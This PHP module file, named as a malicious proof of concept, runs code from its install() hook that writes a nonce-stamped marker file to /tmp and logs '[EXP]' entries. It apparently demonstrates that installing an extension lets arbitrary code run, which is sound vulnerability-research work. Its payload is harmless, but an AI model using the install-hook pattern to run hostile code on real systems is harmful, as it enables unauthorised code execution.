<?php

namespace Modules\Malicious\Poc;

use App\Extension\AbstractModule;
use Illuminate\Support\Facades\Log;

class Module extends AbstractModule
{
    public function install(): bool
    {
        Log::info('[EXP] install() called');

        $markerPath = '/tmp/sqrtrev_marker_' . uniqid() . '.txt';
        $nonce = bin2hex(random_bytes(8));
        
        $content = "SQRTREV_MARKER: {$nonce}\n";
        $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        
        file_put_contents($markerPath, $content);
        
        Log::info("[EXP] marker written: {$markerPath}");

        return parent::install();
    }

    public function boot()
    {
        parent::boot();
    }

    public function register()
    {
        $this->registerConfig();
        $this->registerProviders();
    }
}
